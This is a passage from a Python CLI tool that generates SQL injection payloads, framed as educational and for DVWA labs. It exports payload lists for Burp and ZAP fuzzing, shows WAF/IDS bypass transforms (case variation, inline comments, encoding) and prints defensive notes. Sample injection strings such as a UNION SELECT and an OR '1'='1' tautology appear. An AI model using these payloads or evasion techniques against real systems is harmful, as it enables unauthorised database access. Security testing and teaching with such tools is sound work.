            f.write(f"# Created : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Target  : {db_label.upper()} database\n")
            f.write("# Usage   : ZAP > Fuzzer > Payloads > Add > File > (this file)\n")
            f.write("# Mode    : Offline testing on authorized lab (e.g. DVWA) only\n")
            f.write("# WARNING : Use ONLY on authorized targets with written permission\n")
            f.write("# " + "="*76 + "\n\n")

            f.write("# HOW TO USE IN OWASP ZAP:\n")
            f.write("#   1. Start ZAP → Manual Explore → browse to localhost/DVWA\n")
            f.write("#   2. Find the target request in the History tab\n")
            f.write("#   3. Right-click the request → Attack → Fuzz\n")
            f.write("#   4. In the Fuzz dialog, highlight the injection point\n")
            f.write("#   5. Payloads → Add → Type: File → select this file\n")
            f.write("#   6. Click Start Fuzzer (authorized lab / DVWA ONLY)\n\n")

            for ptype, plist in payloads_dict.items():
                if not plist:
                    continue
                f.write("# " + "="*76 + "\n")
                f.write(f"# {ptype.upper().replace('_', ' ')} — {db_label.upper()}\n")
                f.write("# " + "="*76 + "\n")
                for p in plist:
                    f.write(f"# [{p.detection_difficulty}] {p.description}\n")
                    f.write(f"{p.payload}\n")
                f.write("\n")
        print(f"  ✅ ZAP exported  → {path}")
        print("     Import: ZAP > Fuzzer > Payloads > Add > File")

    def export_json_full(self, payloads_dict: Dict, db_label: str, output_dir: str = "sqli_output"):
        """Export full payload data to JSON"""
        import json, os
        os.makedirs(output_dir, exist_ok=True)
        path = os.path.join(output_dir, f"sqli_{db_label.lower()}_payloads.json")
        data = {}
        for ptype, plist in payloads_dict.items():
            data[ptype] = [
                {
                    'payload':              p.payload,
                    'type':                 p.payload_type.value,
                    'database':             p.db_type.value,
                    'description':          p.description,
                    'difficulty':           p.detection_difficulty,
                    'exploitation_method':  p.exploitation_method,
                }
                for p in plist
            ]
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"  ✅ JSON exported → {path}")

    def display_defensive_notes(self):
        """Display defensive countermeasures and WAF notes"""
        notes = """
    ╔══════════════════════════════════════════════════════════════════╗
    ║              DEFENSIVE NOTES — SQL Injection                     ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  Why WAFs Block SQLi Payloads:                                   ║
    ║  • Signature-based rules matching UNION, SELECT, --, ' etc.      ║
    ║  • Anomaly scoring on request length and special characters       ║
    ║  • Rate limiting when many error responses are detected           ║
    ║                                                                  ║
    ║  How Modern Defenses Detect Evasion:                             ║
    ║  • Normalisation before matching (URL/hex decode first)           ║
    ║  • Case-insensitive regex rules (bypasses case variation)         ║
    ║  • ML-based anomaly detection on query structure patterns         ║
    ║  • Context-aware parsers that strip comments before matching      ║
    ║                                                                  ║
    ║  Best Defenses Against SQLi:                                     ║
    ║  • Parameterised queries / prepared statements  ← #1 defence      ║
    ║  • ORM frameworks with built-in escaping                          ║
    ║  • Least-privilege DB accounts (no DROP / schema access)          ║
    ║  • WAF + strict input validation (defence in depth)               ║
    ║  • Regular DAST scanning and code audits                          ║
    ║                                                                  ║
    ║  Reference:                                                      ║
    ║  https://owasp.org/www-community/attacks/SQL_Injection           ║
    ╚══════════════════════════════════════════════════════════════════╝
        """
        print(notes)


# ============================================================================
# USAGE EXAMPLES AND DEMONSTRATION
# ============================================================================

def demonstrate_payload_generation():
    """Demonstrate payload generation capabilities"""
    
    generator = SQLiPayloadGenerator()
    
    # Example 1: Generate MySQL payloads
    print("\n" + "="*70)
    print("EXAMPLE 1: MySQL Error-Based SQL Injection Payloads")
    print("="*70)
    mysql_payloads = generator.get_payload_by_type(
        SQLiPayloadType.ERROR_BASED, 
        DatabaseType.MYSQL
    )
    for payload in mysql_payloads[:2]:
        generator.display_payload(payload)
    
    # Example 2: Generate PostgreSQL UNION-based payloads
    print("\n" + "="*70)
    print("EXAMPLE 2: PostgreSQL UNION-Based SQL Injection Payloads")
    print("="*70)
    pg_payloads = generator.get_payload_by_type(
        SQLiPayloadType.UNION_BASED,
        DatabaseType.POSTGRESQL
    )
    for payload in pg_payloads[:1]:
        generator.display_payload(payload)
    
    # Example 3: Boolean-based blind SQLi
    print("\n" + "="*70)
    print("EXAMPLE 3: Boolean-Based Blind SQL Injection (Description Only)")
    print("="*70)
    blind_payloads = generator.get_payload_by_type(
        SQLiPayloadType.BOOLEAN_BLIND,
        DatabaseType.MYSQL
    )
    for payload in blind_payloads[:1]:
        generator.display_payload(payload)
    
    # Example 4: Time-based blind SQLi
    print("\n" + "="*70)
    print("EXAMPLE 4: Time-Based Blind SQL Injection (Description Only)")
    print("="*70)
    time_payloads = generator.get_payload_by_type(
        SQLiPayloadType.TIME_BASED,
        DatabaseType.MYSQL
    )
    for payload in time_payloads[:1]:
        generator.display_payload(payload)
    
    # Example 5: Comment-based bypasses
    print("\n" + "="*70)
    print("EXAMPLE 5: Comment-Based Bypass Payloads")
    print("="*70)
    comment_payloads = generator.get_payload_by_type(
        SQLiPayloadType.COMMENT_BYPASS,
        DatabaseType.MYSQL
    )
    for payload in comment_payloads[:2]:
        generator.display_payload(payload)
    
    # Example 6: Case variations and WAF bypass
    print("\n" + "="*70)
    print("EXAMPLE 6: Case Variation and Encoding Bypasses")
    print("="*70)
    sample_payload = "UNION SELECT user(), version()"
    
    print(f"\nOriginal payload: {sample_payload}")
    print("\nCase variations:")
    for variation in CaseVariationBypass.generate_case_variations(sample_payload)[:3]:
        print(f"  {variation}")
    
    print("\nInline comment bypass:")
    print(f"  {CaseVariationBypass.generate_inline_comment_bypass(sample_payload)}")
    
    print("\nEncoding variations:")
    encodings = CaseVariationBypass.generate_encoding_variations("admin")
    for enc_type, enc_payload in encodings.items():
        print(f"  {enc_type}: {enc_payload[:50]}...")
    
    print("\nWhitespace bypass:")
    print(f"  {CaseVariationBypass.generate_whitespace_bypass(sample_payload)}")
    
    # Example 7: Export payloads
    print("\n" + "="*70)
    print("EXAMPLE 7: Export Capabilities")
    print("="*70)
    print("Generating comprehensive MySQL payloads export...")
    generator.export_payloads_json(DatabaseType.MYSQL, "mysql_payloads.json")
    print("✓ MySQL payloads exported to mysql_payloads.json")


# ============================================================================
# CLI ENTRY POINT
# ============================================================================

def print_banner():
    """Display tool banner"""
    banner = """
   ═══════════════════════════════════════════════════════════════

        ███████╗ ██████╗ ██╗     ██╗
        ██╔════╝██╔═══██╗██║     ██║
        ███████╗██║   ██║██║     ██║
        ╚════██║██║▄▄ ██║██║     ██║
        ███████║╚██████╔╝███████╗██║
        ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝

           INJECTION PAYLOAD GENERATOR

   ═══════════════════════════════════════════════════════════════

    Purpose: SQL injection simulation for security learning
    """
    print(banner)


def print_ethical_warning():
    """Display ethical use warning"""
    warning = """
    ⚠️  ETHICAL DISCLAIMER:
    ═══════════════════════════════════════════════════════════════
    This tool is for EDUCATIONAL and AUTHORIZED testing ONLY.

    ✅ Permitted Use:
       • Authorized penetration testing
       • Academic learning and research
       • CTF challenges and security labs
       • Your own systems and databases

    ❌ Prohibited Use:
       • Unauthorized database access
       • Real-world attacks without permission
       • Any illegal activities

    ❌ NO LIVE DATABASE INTERACTION — Simulation mode only.

    By using this tool, you agree to comply with all applicable laws
    and ethical guidelines (OWASP Code of Ethics).
    ═══════════════════════════════════════════════════════════════
    """
    print(warning)


def main():
    """Main function — CLI argument parser"""
    import argparse
    import sys
    import urllib.parse
    import base64

    parser = argparse.ArgumentParser(
        description='Educational Payload Generation Framework — SQLi Module',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 sql_injection_payload_generator.py --module sqli
  python3 sql_injection_payload_generator.py --module sqli --db mysql
  python3 sql_injection_payload_generator.py --module sqli --db postgresql --type union
  python3 sql_injection_payload_generator.py --module sqli --db mysql --output json
  python3 sql_injection_payload_generator.py --module sqli --db all --output burp --no-banner
  python3 sql_injection_payload_generator.py --module sqli --bypass --output zap
  python3 sql_injection_payload_generator.py --module sqli --explain --output cli
  python3 sql_injection_payload_generator.py --module sqli --defensive

For more information: https://owasp.org/www-community/attacks/SQL_Injection
        """
    )

    # ── Module selector (kept consistent with XSS main.py style) ─────────────
    parser.add_argument(
        '--module',
        choices=['sqli'],
        default='sqli',
        help='Select vulnerability module (default: sqli)'
    )

    # ── Database selector ──────────────────────────────────────────────────────
    parser.add_argument(
        '--db',
        choices=['mysql', 'postgresql', 'mssql', 'all'],
        default='all',
        help='Database type: mysql, postgresql, mssql, or all (default: all)'
    )

    # ── Injection type ─────────────────────────────────────────────────────────
    parser.add_argument(
        '--type',
        choices=['error', 'union', 'blind', 'time', 'comment', 'all'],
        default='all',
        help='Injection type: error, union, blind, time, comment, or all (default: all)'
    )

    # ── Encoding ───────────────────────────────────────────────────────────────
    parser.add_argument(
        '--encode',
        choices=['none', 'url', 'base64', 'hex'],
        default='none',
        help='Encoding method for bypass examples: none, url, base64, hex (default: none)'
    )

    # ── Output format ──────────────────────────────────────────────────────────
    parser.add_argument(
        '--output',
        choices=['cli', 'json', 'txt', 'burp', 'zap', 'all'],
        default='cli',
        help=(
            'Output format: cli, json, txt, burp, zap, all\n'
            '  cli  - Print to terminal\n'
            '  json - Export JSON file\n'
            '  txt  - Export plain text catalog\n'
            '  burp - Export Burp Suite Intruder list\n'
            '  zap  - Export OWASP ZAP Fuzzer list\n'
            '  all  - Export all formats at once\n'
            '(default: cli)'
        )
    )

    parser.add_argument(
        '--bypass',
        action='store_true',
        help='Include WAF/IDS bypass techniques (case variations, comment insertion, whitespace)'
    )

    parser.add_argument(
        '--explain',
        action='store_true',
        help='Include detailed exploitation method descriptions for each payload'
    )

    parser.add_argument(
        '--stats',
        action='store_true',
        help='Show payload statistics summary'
    )

    parser.add_argument(
        '--defensive',
        action='store_true',
        help='Show defensive notes and WAF countermeasures'
    )

    parser.add_argument(
        '--no-banner',
        action='store_true',
        help='Suppress banner and ethical warning prompt'
    )

    args = parser.parse_args()

    # ── Banner / ethics gate ──────────────────────────────────────────────────
    if not args.no_banner:
        print_banner()
        print_ethical_warning()
        confirm = input("\n⚠️  Do you agree to use this tool ethically? (yes/no): ").strip().lower()
        if confirm not in ['yes', 'y']:
            print("\n❌ User declined ethical terms. Exiting...")
            sys.exit(0)
        print("\n✅ Proceeding with payload generation...\n")

    generator = SQLiPayloadGenerator()

    # ── Defensive notes only ──────────────────────────────────────────────────
    if args.defensive:
        generator.display_defensive_notes()
        sys.exit(0)

    # ── DB / type mapping ─────────────────────────────────────────────────────
    db_map = {
        'mysql':      DatabaseType.MYSQL,
        'postgresql': DatabaseType.POSTGRESQL,
        'mssql':      DatabaseType.MSSQL,
    }
    db_targets = list(db_map.items()) if args.db == 'all' else [(args.db, db_map[args.db])]

    type_key_map = {
        'error':   'error_based',
        'union':   'union_based',
        'blind':   'boolean_blind',
        'time':    'time_based',
        'comment': 'comment_bypass',
    }

    # ── Iterate over database targets ─────────────────────────────────────────
    for db_label, db_type in db_targets:
        payloads_dict = generator.generate_payloads_by_database(db_type)

        # Filter by injection type
        if args.type != 'all':
            key = type_key_map[args.type]
            payloads_dict = {key: payloads_dict.get(key, [])}

        # Stats summary
        if args.stats:
            total = sum(len(v) for v in payloads_dict.values())
            print(f"\n📊 Stats [{db_label.upper()}]: {total} payloads across {len(payloads_dict)} categories")

        # WAF bypass section
        if args.bypass:
            print(f"\n{'='*70}")
            print(f"  WAF/IDS BYPASS TECHNIQUES — {db_label.upper()}")
            print(f"{'='*70}")
            sample = "UNION SELECT user(), version()"
            print(f"\n  Original payload  : {sample}")
            print("\n  Case variations:")
            for v in CaseVariationBypass.generate_case_variations(sample)[:3]:
                print(f"    {v}")
            print(f"\n  Comment bypass    : {CaseVariationBypass.generate_inline_comment_bypass(sample)}")
            print(f"  Whitespace bypass : {CaseVariationBypass.generate_whitespace_bypass(sample)}")
            print("\n  Encoding variations on 'admin':")
            for enc_type, enc_val in CaseVariationBypass.generate_encoding_variations("admin").items():
                print(f"    {enc_type:8s}: {str(enc_val)[:60]}")

        # Encoding demo
        if args.encode != 'none':
            flat = [p for plist in payloads_dict.values() for p in plist]
            sample_payload = flat[0].payload if flat else "1' OR '1'='1"
            print(f"\n  📦 Encoding ({args.encode}) applied to first payload:")
            if args.encode == 'url':
                print(f"    {urllib.parse.quote(sample_payload)}")
            elif args.encode == 'base64':
                print(f"    {base64.b64encode(sample_payload.encode()).decode()}")
            elif args.encode == 'hex':
                print(f"    {sample_payload.encode().hex()}")

        # Output routing
        if args.output == 'all':
            print(f"\n📦 Exporting all formats for {db_label.upper()}...")
            generator.display_cli(payloads_dict, include_explanation=args.explain)
            generator.export_json_full(payloads_dict, db_label)
            generator.export_txt(payloads_dict, db_label)
            generator.export_burp(payloads_dict, db_label)
            generator.export_zap(payloads_dict, db_label)
            print(f"\n✅ All formats exported to sqli_output/")
        elif args.output == 'cli':
            count = generator.display_cli(payloads_dict, include_explanation=args.explain)
            print(f"\n✅ Generated {count} SQLi payload templates for {db_label.upper()}")
        elif args.output == 'json':
            generator.export_json_full(payloads_dict, db_label)
        elif args.output == 'txt':
            generator.export_txt(payloads_dict, db_label)
        elif args.output == 'burp':
            generator.export_burp(payloads_dict, db_label)
        elif args.output == 'zap':
            generator.export_zap(payloads_dict, db_label)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Operation cancelled by user (Ctrl+C)")
        import sys; sys.exit(0)
    except Exception as e:
        print(f"\n❌ Unexpected error occurred: {e}")
        import sys; sys.exit(1)
    print("\nAll payloads are for EDUCATIONAL purposes in controlled lab environments")